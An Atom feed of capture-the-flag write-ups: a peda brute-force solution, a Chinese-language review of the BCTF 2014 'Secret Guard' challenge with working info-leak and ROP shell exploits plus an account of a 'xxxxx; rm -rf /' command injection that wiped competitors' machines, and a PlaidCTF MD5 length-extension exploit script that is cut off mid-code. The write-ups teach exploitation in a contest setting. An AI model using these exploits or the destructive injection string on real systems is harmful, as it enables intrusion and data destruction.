<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Writeup | From Zero To X]]></title>
  <link href="http://blog.ztrix.me/blog/categories/writeup/atom.xml" rel="self"/>
  <link href="http://blog.ztrix.me/"/>
  <updated>2014-07-07T10:41:14+08:00</updated>
  <id>http://blog.ztrix.me/</id>
  <author>
    <name><![CDATA[zTrix]]></name>
    <email><![CDATA[i@ztrix.me]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[The Power of PEDA - ASIS CTF Quals 2014 Serial Number Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/05/10/asis-quals-2014-serial-number-writeup/"/>
    <updated>2014-05-10T23:09:41+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/05/10/asis-quals-2014-serial-number-writeup</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>Again, another ELF x86_64 binary with very long bit operation logic asking for some serial number.</p>

<p>I can still remember the time <a href="http://blog.ztrix.me/blog/2014/01/29/phdays-quals-2014-turututu/">trying to solve Turututu</a>, during which I spent a lot of time trying to figure out what happened under the instructions, but sadly with no luck, it&rsquo;s totally a mess. The lucky thing is that <a href="http://github.com/longld/peda">peda</a> is really a powerful tool, and I can guess the hidden logic with the help of <a href="http://github.com/longld/peda">peda</a>, so I finally solved Turututu.</p>

<p>So let&rsquo;s show what a powerful tool <a href="http://github.com/longld/peda">peda</a> is by solving this challenge without figuring out that long bit operation logic(over 1 thousand lines of asm code!).</p>

<!-- more -->


<p>First, it&rsquo;s easy to understand the overall logic. Here is the pseudocode(python-like).</p>

<pre><code>serial_number = some_8_bytes_integer
state = 0   # four bit state
correct_serial = 0

while serial_number &gt; 0:
    nibble = serial_number &amp; 0xf
    serial_number = serial_number &gt;&gt; 4
    correct_serial = nibble == 0xd &amp;&amp; state == 0xd
    state = some_very_long_logic_over_a_thousand_lines_of_asm(nibble, state)

if correct_serial:
    print 'Congratulations!'
</code></pre>

<p>Here, nibble and state are both 4 bit variables. So no matter what the <code>some_very_long_logic_over_a_thousand_lines_of_asm</code> function is, there is only <code>16 x 16 = 256</code> possibilities. Just brute-force them all using <a href="http://github.com/longld/peda">peda</a>!</p>

<p>So I wrote the following <a href="http://github.com/longld/peda">peda</a> helper function, by setting breakpoint at end of <code>some_very_long_logic_over_a_thousand_lines_of_asm</code> and using <code>set $rip=0x400788</code>, we can run that piece of code multiple times.</p>

<p>```python
def god(self, *arg):</p>

<pre><code>"""
god mode
"""
msg('god mode')
rbp = peda.getreg('rbp')
array_pointers = peda.read_int(rbp-0x28, 8)

def get_state():
    ret = []
    for i in range(4):
        pointer = peda.read_int(array_pointers + i * 8, 8)
        ret.append(peda.read_int(pointer + 4, 4))
    return ret

def set_state(state):
    for i in range(4):
        pointer = peda.read_int(array_pointers + i * 8, 8)
        peda.write_int(pointer + 4, state[i], 4)

def check_one(t, init):
    peda.write_int(rbp-0x68, t, 1)
    peda.execute('set $rip=0x400788')

    # msg('extracted = %d%d%d%d, remain = %x' % (peda.read_int(rbp-0x44, 4), peda.read_int(rbp-0x48, 4), peda.read_int(rbp-0x4c, 4), peda.read_int(rbp-0x50, 4), peda.read_int(rbp-0x68, 8)))

    set_state(init)
    peda.execute('continue')
    state2 = get_state()

    return state2

final = []
for i in range(16):
    init = [i &amp; 1, (i &gt;&gt; 1) &amp; 1, (i&gt;&gt;2) &amp; 1, (i&gt;&gt;3) &amp; 1]
    for j in range(16):
        rs = check_one(j, init)
        msg('%x: %s -&gt; %s' % (j, init, rs))
        final.append((j, init, rs))

msg('%s' % final)
return
</code></pre>

<p>```</p>

<p>So, the only thing left is <code>gdb -x gdb.x</code>, here it is.</p>

<pre><code>file serial-number
b *0x4014d8
b *0x40149c
run
</code></pre>

<p>Then use god mode to brute force.</p>

<p>After brute force and a little processing, we can get the following jump table</p>

<pre><code>0 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0]
1 [0, 0, 0, 0, 9, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
2 [0, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
3 [3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3]
4 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12]
5 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 13, 0, 0, 0, 0, 0]
6 [0, 0, 0, 0, 0, 14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
7 [7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7]
8 [0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0]
9 [0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
10 [0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
11 [11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11, 11]
12 [0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0]
13 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
14 [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0]
15 [15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15, 15]
</code></pre>

<p>So the serial number is <code>da34c5217f9d</code>.</p>

<p>Can you feel the power of <a href="http://github.com/longld/peda">peda</a> tonight?</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BCTF 2014 决赛题 - Secret Guard 回顾与分析]]></title>
    <link href="http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard/"/>
    <updated>2014-05-07T09:08:55+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/05/07/bctf-secret-guard</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p><a href="/downloads/secret-guard.7594d1be5c8e9a13c98676c6b516f5ce">secret-guard</a> 作为 BCTF 2014 决赛中最简单的一道 binary 题目，设计目标为，能够在放出后 4 个小时左右被各队逐渐解出，达到一波得分高潮。漏洞设置方面，设置了 3 个不同类型的简单漏洞，分别属于信息泄露、栈溢出和命令注入，期望是各个队伍发现不同的漏洞，达到互有攻防，反复抢占阵地的激烈效果。</p>

<p>根据比赛的实际情况来看，题目足够简单，作为最简单的 binary 题目，4 个小时内被解出的目标完成了，但是没有想到的是，在很长的一段时间内，只有 HITCON 217 一个队伍解出这道简单题目，并且只利用了其中命令注入的最简单漏洞。赛后的交流得知，开始时很多人以为每个题目只有一个漏洞，于是找到漏洞之后，就去看别的题目了，没有再仔细研究这个题目。另外，不知道是由于此题攻击流量分析较为困难还是各个队伍经验较少的原因，所有其他队伍一直处于被打状态而没有及时修补，导致得分差距太大，所以总体感觉甚为惋惜，花费心思设置的各个漏洞和坑点大家都没有遇到，也没有达到预期的效果。</p>

<h2>关于这题的一些统计信息</h2>

<!-- more -->


<table>
<thead>
<tr>
<th></th>
<th> 队伍     </th>
<th align="center">      攻击次数      </th>
<th align="center">  被攻击次数 </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> HITCON 217    </td>
<td align="center"> 716 </td>
<td align="center"> 0   </td>
</tr>
<tr>
<td></td>
<td> 0ops          </td>
<td align="center"> 379 </td>
<td align="center"> 12  </td>
</tr>
<tr>
<td></td>
<td> DISA          </td>
<td align="center"> 307 </td>
<td align="center"> 79  </td>
</tr>
<tr>
<td></td>
<td> Light4Freedom </td>
<td align="center"> 229 </td>
<td align="center"> 575 </td>
</tr>
<tr>
<td></td>
<td> Pax.Mac Team  </td>
<td align="center"> 197 </td>
<td align="center"> 91  </td>
</tr>
<tr>
<td></td>
<td> Sigma         </td>
<td align="center"> 137 </td>
<td align="center"> 86  </td>
</tr>
<tr>
<td></td>
<td> 我是狗汪汪    </td>
<td align="center"> 87  </td>
<td align="center"> 661 </td>
</tr>
<tr>
<td></td>
<td> 无名          </td>
<td align="center"> 284 </td>
<td align="center"> 116 </td>
</tr>
</tbody>
</table>


<br/>


<h2>总体服务状态</h2>

<ul>
<li>1 &ndash; down</li>
<li>31 &ndash; error</li>
<li>1597 &ndash; ok</li>
</ul>


<h2>漏洞分析</h2>

<p>首先要看懂程序逻辑，作为 secret guard，它打开的第一个秘密文件其实就是 flag 文件。并且将 flag 的前一半作为 secret key。每次连接服务，可以给一个随机数种子，然后获得 secret key 中的一个 byte。</p>

<p>随后，程序会向用户询问 16 个关于 secret key 的问题，如果全部答对，才能得到 access 权限。</p>

<p>取得权限之后，用户可以输入一个 pid，然后程序会调用 lsof 命令，打印出这个 pid 打开的秘密文件有哪些。</p>

<h3>漏洞一 &ndash; 任意信息泄露漏洞</h3>

<p>首先，随机数种子确定的时候，随机数的序列是固定的。因此很容易找到一个序列，让他们作为随机种子之后，随机得到 0 1 2 &hellip; 15 的序列。有了这个序列之后，是可以轻松获得 flag 的前面一半的。</p>

<p>```python</p>

<h1><a href="http://github.com/zTrix/zio">http://github.com/zTrix/zio</a></h1>

<p>from zio import *</p>

<p>def get_char(p):</p>

<pre><code>io = zio((host, port), print_write = COLORED(REPR))
io.read_until('sneak peek')

io.writeline(p)
io.read_until('here: ')
line = io.readline().strip()
io.readline()
io.close()
return line
</code></pre>

<p>def get_flag_first_half():</p>

<pre><code>tbl = [12, 65, 22, 9, 36, 7, 18, 1, 8, 17, 2, 5, 16, 4, 23, 10]

half = []
for s in tbl:
    half.append(get_char(str(s)))

return ''.join(half)
</code></pre>

<p>```</p>

<p>仔细分析可以发现，0x401480(sneak_peek) 这个函数是有溢出漏洞的，除了 <code>\r \n</code> 之外，可以覆盖其他任意字符到栈上高位。但是这个函数有 stack canary 保护，因此没法直接利用 return address 来控制 EIP。不过这个 stack frame 内部的变量是可以任意覆盖的，只要变量的地址在 buf 和 canary 之间。进一步分析，可以发现，获取随机种子之后，程序会打印出栈上某个指针所指字符串的一个字母，而这个指针是可以覆盖的。</p>

<p>原始代码如下，也就是下面的 <code>big_secret</code> 是可以覆盖的，于是可以直接把这个变量覆盖成 <code>flag_bss</code>，从而泄漏一个字节。总共 32 次就可以泄漏完整的 flag</p>

<p><code>cpp
srand(seed);
p = rand() % len;
printf("Your piece of secret here: %c\n", big_secret[p]);
</code></p>

<p>第一个漏洞的攻击代码如下：</p>

<p>```python
flag_bss = 0x402420</p>

<p>def pwn1():</p>

<pre><code>flag = []
for index in range(32):
    ad = flag_bss + index
    seed = 12
    if ad &amp; 0xff in (0xd, 0xa):
        seed = 65
        ad -= 1
    p = str(seed) + ' ' * 14 + l64(16) * 2 + l64(ad)
    flag.append(get_char(p))

return ''.join(flag)
</code></pre>

<p>```</p>

<p>这个漏洞与 openssl heartbleed 漏洞有几分相似，可以泄漏内存中任意地址信息，每次一个 byte，效率略低，但是对于 flag 来说足够了。</p>

<p>这个漏洞的修补并不困难，buffer 读入的时候，检查一下大于 16 就退出循环即可。</p>

<h3>漏洞二 &ndash; 栈溢出漏洞</h3>

<p>在程序问 16 个问题的函数中，存在第二个漏洞，并且是一个裸的 buffer overflow 漏洞。每次回答问题的输入，会被 gets 函数读入，而 gets 是一个非常危险的函数。</p>

<p>这个漏洞比较简单，直接构造 ROP chain 打印 flag 即可。注意 <code>printf</code> 进入之前需要 al 寄存器设置为 0，否则会崩溃，具体原因没有深究，<code>0x400f10</code> 是一个返回值为 0 的函数，可以用来设置 rax 为 0.</p>

<p>```python</p>

<h1><a href="http://github.com/zTrix/zio">http://github.com/zTrix/zio</a></h1>

<p>from zio import *</p>

<p>def pwn2():</p>

<pre><code>io = zio(target, print_write = COLORED(REPR), timeout = 10000, write_delay = 0)
io.read_until('sneak peek')
io.writeline('s')
io.read_until('to access:')
io.read_until('?') 
pop_ret = 0x00401a63
system = 0x400d70
printf = 0x400c60
gets = 0x400da0
scanf = 0x400d40
strlen = 0x402258
# io.gdb_hint()
io.writeline('_' * 16 + 'AAAA' + l64(0x1) + 'A' * 4 + l64(flag_bss) + 'A' * 8 + 'B' * 8 + l64(0x400f10) + l64(pop_ret) + l64(flag_bss) + l64(printf) + l64(scanf))
io.print_read = REPR
io.read()
io.interact()
</code></pre>

<p>```</p>

<p>如果想从这个漏洞拿 shell，就需要泄漏一次地址再跳回程序，利用稍微麻烦一点</p>

<p>```python</p>

<h1><a href="http://github.com/zTrix/zio">http://github.com/zTrix/zio</a></h1>

<p>from zio import *</p>

<p>def pwn3():</p>

<pre><code>io = zio(target, print_write = COLORED(REPR), timeout = 10000, write_delay = 0)
io.read_until('sneak peek')
io.writeline('s')
io.read_until('to access:')
io.read_until('?') 
pop_ret = 0x00401a63
system = 0x400d70
printf = 0x400c60
gets = 0x400da0
scanf = 0x400d40
strlen = 0x402258
answer = 0x401710
init = 0x400f10
io.writeline('_' * 16 + 'AAAA' + l64(0x1) + 'A' * 4 + l64(flag_bss) + 'A' * 8 + 'B' * 8 + l64(init) + l64(pop_ret) + l64(strlen) + l64(printf) + l64(pop_ret) + l64(flag_bss) + l64(answer))
io.print_read = REPR
io.readline()
io.readline()
addr = io.read(6)
strlen_libc = l64(addr.ljust(8, '\x00'))
libc_base = strlen_libc - 0x81c40
binsh = libc_base + 1443474
log('addr = %s, strlen_libc = %x, libc_base = %x, binsh = %x' % (repr(addr), strlen_libc, libc_base, binsh), 'red')
io.readline()
# io.gdb_hint()
io.writeline('_' * 16 + 'AAAA' + l64(0x1) + 'A' * 4 + l64(flag_bss) + 'A' * 8 + 'B' * 8 + l64(pop_ret) + l64(binsh) + l64(system))
flag = io.readline()
io.writeline('cat /home/flags/secret-guard/flag; exit;')
# flag = io.readline()
flag = io.read()
io.close()
return flag
</code></pre>

<p>```</p>

<p>这个漏洞的修补更加简单，直接把 gets 改成 getchar 即可，但是换行可能会吃掉导致逻辑错误，因此可能需要两个 getchar</p>

<h3>漏洞三 &ndash; 命令注入漏洞</h3>

<p>漏洞三就是比赛队伍一直在利用的 shell injection 漏洞。原理和利用都比较简单，这里就不再赘述了。设计这个漏洞的时候，因为太过简单，就把它放在了程序最后，具有一定的隐蔽性。因此可能造成了不少队伍很晚才发现这个漏洞。</p>

<p>当初设计这个漏洞，同时还有两个目的：</p>

<ul>
<li>纪念 <a href="http://weibo.com/d34dc47">D3AdCa7</a> 童鞋去年 defcon 决赛中，因为写了未加检查的 curl 提交 flag 脚本，因此被别人 flag 中的 <code>xxxxx; rm -rf /</code> 删除了整个系统。好在由于权限原因，重要的个人文件资料并未删除。</li>
<li>提醒大家重视 shell injection，特别是 shell 脚本中，很容易未加检查就信任输入，造成 injection。</li>
</ul>


<p>比较巧合的事情是，<a href="http://weibo.com/d34dc47">D3AdCa7</a>  童鞋的 defcon 遭遇居然在这次决赛中又重演了，而且，就是在这个我设置了 shell injection 漏洞的地方，本意是提醒大家，结果有的队伍直接修改返回为 <code>xxxxx; rm -rf /</code>，我发现这个问题的时候，立刻过去要求他们去掉，恶作剧一下即可，如果真造成损失就不好了，但是没想到当时就已经有其他队伍中招了，并且是不止一个队员。</p>

<p>不知道中招情况如何，但是感觉题目本意想达到的提醒大家注意 shell injection 漏洞的效果被这次意外完成了，无论是中招的童鞋，还是事后谈论的童鞋，应该都会有所防范吧。</p>

<h2>题目总结</h2>

<p>总体来看，虽然是一道不难的题目，但是还是花了不少心思来设计的，有些设计目标达到了，但是也很遗憾没有达到预期结果，特别是前面两个漏洞都没有人利用。</p>

<p>题目中还设置了一些坑点，增加题目趣味性</p>

<ul>
<li>为了防止大家过于容易修改 flag 文件路径，我写了一个山寨 base64 解码得到文件地址。其实和程序逻辑没有什么关系，但是听说有队伍逆向了半天这个 base64，LOL</li>
<li>为了防止大家抓包之后不经分析就直接重放流量，设置了两个障碍

<ol>
<li>各队 flag 各不相同，因此同样的流量，不能回答正确 16 个问题</li>
<li>每次只能获取一个 byte 的信息，因此想回答 16 个问题，至少需要连接 16 次，这样抓包后，攻击流量就会在不同的 TCP stream 中，给分析流量造成一定困难。</li>
</ol>
</li>
<li>另外，ROP chain 的构造中，还有设置 AL 寄存器为 0 的坑，这个不是故意设计的，而是 ABI 方面的坑</li>
</ul>


<p><a href="/downloads/secret-guard.7594d1be5c8e9a13c98676c6b516f5ce">题目文件下载</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PlaidCTF 2014 - Parlor (Crypto 250) Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/04/14/plaidctf-2014-parlor-writeup/"/>
    <updated>2014-04-14T21:12:55+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/04/14/plaidctf-2014-parlor-writeup</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>Problem description</p>

<pre><code>Crypto (250 pts)

The Plague is running a betting service to build up funds for his massive empire. Can you 
figure out a way to beat the house? The service is running at 54.197.195.247:4321.
</code></pre>

<!-- more -->


<p>use nc to connect the service, we got the following screen</p>

<pre><code>/------------------------------------------------------------------------------\
| Welcome to the betting parlor!                                               |
|                                                                              |
| We implement State of the Art cryptography to give you the fairest and most  |
| exciting betting experience!                                                 |
|                                                                              |
| Here's how it works: we both pick a nonce, you tell us odds, and you give us |
| some money.                                                                  |
| If md5(our number + your number) % odds == 0, you win bet amount*odds.       |
| UPDATE: IF YOU DIDN'T REALIZE IT, WE DO INCLUDE A NEWLINE AT THE END OF YOUR |
| NUMBER. SORRY FOR THE INCONVENIENCE. THANK YOU FOR USING PARLOR              |
| Otherwise, we get your money! We're even so nice, we gave you $1000 to start.|
|                                                                              |
| If you don't trust us, we will generate a new nonce, and reveal the old nonce|
| to you, so you can verify all of our results!                                |
|                                                                              |
| (Oh, and if you win a billion dollars, we'll give you a flag.)               |
\______________________________________________________________________________/

====================
  1) set your odds
  2) set your bet
  3) play a round
  4) get balance
  5) reveal nonce
  6) quit
====================
</code></pre>

<p>So, it&rsquo;s a small betting game, if we can win enough money, we&rsquo;ll get a flag.</p>

<p>Studying the rules, we can see that, the smaller the odds, the more likely we can win. If we set odds to <code>1^2</code>, the chance to win will be a half. But we cannot bet the same nonce after winning.</p>

<p>So if we can figure out a way to always win, then we can double our balance each time, reaching a billion won&rsquo;t be a problem any more.</p>

<p>Since the md5 is calculated on <code>server_nonce + player_nonce</code>, and <code>server_nonce</code> won&rsquo;t change until you reveal it, and <code>player_nonce</code> is under our control, so we can easily think of the <a href="http://en.wikipedia.org/wiki/Length_extension_attack">Hash length extension attack</a>.</p>

<p>However, to use <a href="http://en.wikipedia.org/wiki/Length_extension_attack">Hash length extension attack</a>, we need the result of <code>md5(server_nonce + player_nonce)</code>. If we set odds to <code>1^100</code>, then we can get 100 bits of the md5 digest, how about the remaining 28 bits?</p>

<p>Since <code>2^28</code> is not a huge number, we can use brute-force. Here is the attack plan:</p>

<ol>
<li> Set our bet to 1$, odds to <code>2^100</code>, play a round, send &lsquo;a\n&rsquo;</li>
<li> It&rsquo;s mostly likely we will lose, never mind, grab the generated value, which should be sth like <code>0000000171ccbeef0869667267a6bbdd</code> in hex format.</li>
<li> Construct hash length attack padding suffix, play another round, send &lsquo;a\n&rsquo; + suffix + &lsquo;b\n&rsquo;, which would be sth like <code>a\n\x80\x00\x00......\x00\x90\x00\x00\x00\x00\x00\x00\x00b\n</code></li>
<li> And, not surprised, we lose again, never mind, grab the second generated value, which should be sth like <code>0000000f48eabc92e4b180a8d1b7c3d3</code> in hex format.</li>
</ol>


<p>OK, now we know</p>

<ol>
<li> <code>md5(server_nonce + 'a\n') == XXXXXX171ccbeef0869667267a6bbdd</code></li>
<li> <code>md5(server_nonce + 'a\n\x80\x00......\x00\x90\x00\x00\x00\x00\x00\x00\x00b\n' == YYYYYYf48eabc92e4b180a8d1b7c3d3</code></li>
<li> if we know the value of XXXXXXX, we can calculate YYYYYYf48eabc92e4b180a8d1b7c3d3 by hash length extention attack</li>
</ol>


<p>So just brute-force the value of XXXXXXX, and calculate the second md5 value, until we get the same suffix (f48eabc92e4b180a8d1b7c3d3).</p>

<p>After that, use hash extension attack again to search md5 hashes ending with bit 0, which is very easy. Send those winning nonce and get the flag!</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span> (parlor.py)</span> <a href='/downloads/code/plaidctf-2014-parlor-writeup/parlor.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/env python2</span>
</span><span class='line'><span class="c">#-*- coding:utf-8 -*-</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">subprocess</span>
</span><span class='line'>
</span><span class='line'><span class="c"># https://github.com/zTrix/zio</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">md5_ext</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">a</span><span class="p">):</span>
</span><span class='line'>    <span class="n">tl</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
</span><span class='line'>    <span class="n">ret</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x80</span><span class="s">&#39;</span>
</span><span class='line'>    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">%</span> <span class="mi">64</span> <span class="o">!=</span> <span class="mi">56</span><span class="p">:</span>
</span><span class='line'>        <span class="n">ret</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
</span><span class='line'>    <span class="n">ret</span> <span class="o">+=</span> <span class="n">l32</span><span class="p">(</span><span class="n">tl</span><span class="p">)</span>
</span><span class='line'>    <span class="n">ret</span> <span class="o">+=</span> <span class="n">l32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">ret</span> <span class="o">+</span> <span class="n">a</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="s">&#39;54.197.195.247&#39;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">4321</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;and 100):&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;we generated &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">remain1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="n">remain1_str</span> <span class="o">=</span> <span class="s">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">remain1</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">remain1</span><span class="p">,</span> <span class="n">remain1_str</span>
</span><span class='line'>
</span><span class='line'><span class="n">ext</span> <span class="o">=</span> <span class="n">md5_ext</span><span class="p">(</span><span class="s">&#39;k&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="s">&#39;b</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ext</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;we generated &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">remain2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="n">remain2_str</span> <span class="o">=</span> <span class="s">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">remain2</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">remain2</span><span class="p">,</span> <span class="n">remain2_str</span>
</span><span class='line'>
